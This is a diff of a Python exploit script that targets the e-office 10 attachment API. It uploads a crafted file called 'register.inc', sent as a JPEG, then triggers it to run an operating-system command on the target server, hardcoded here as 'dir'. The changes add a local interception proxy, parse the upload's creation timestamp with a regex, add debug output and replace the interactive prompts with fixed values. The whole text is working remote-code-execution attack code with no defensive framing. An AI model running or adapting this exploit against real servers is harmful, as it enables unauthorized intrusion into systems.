@@ -46,7 +46,7 @@ import hashlib
 import time
 from hashlib import sha1
 import base64
-
+import re
 
 def payload(url,cmd):
     urls = url + '/eoffice10/server/public/api/attachment/atuh-file'
@@ -60,7 +60,7 @@ def payload(url,cmd):
     newfile = data + sha1(data).digest() + final
     upload_file = {"Filedata": ("register.inc", newfile, "image/jpeg")}
     urllib3.disable_warnings()
-    response = requests.post(url=urls, files=upload_file, headers=hearder)  # ,proxies=proxy)
+    response = requests.post(url=urls, files=upload_file, headers=hearder,proxies={"http":"http://127.0.0.1:8081","https":"https://127.0.0.1:8081"})
     response_text = response.text
     attachment_id = json.loads(response_text)['data']['attachment_id']
 
@@ -71,8 +71,13 @@ def payload(url,cmd):
     }
     urllib3.disable_warnings()
     response = requests.post(url=urls, headers=heards, verify=False)  # ,proxies=proxy)
+    print(response.text)
+
     response_json = response.json()
-    filename = str(response_json["histories"][0]["create_time"]) + 'register.inc'
+    create_time = re.findall(r"create_time\":(.*?),\"modify_tim",response.text)
+
+
+    filename = str(create_time) + 'register.inc'
     md5name = hashlib.md5(filename.encode())
     md5name = md5name.hexdigest()
     Time = time.strftime('%Y/%m/%d', time.localtime(time.time()))
@@ -85,13 +90,14 @@ def payload(url,cmd):
     response = requests.post(url=urls, verify=False, headers=hearder)  # ,proxies=proxy)
     response_text = response.text
     print(response_text)
-    result = response_text.split('}')[-1]
-    print(result)
+    #result = response_text.split('}')[-1]
+    #print(result)
 
 
 if __name__ == '__main__':
-    url = input("url: ")
-    cmd = input("要执行的命令: ")
+    url = ""
+    #url = "
+    cmd = "dir"
     if not url.startswith(("http://", "https://")):
         url = "http://" + url
     if url.endswith("/"):
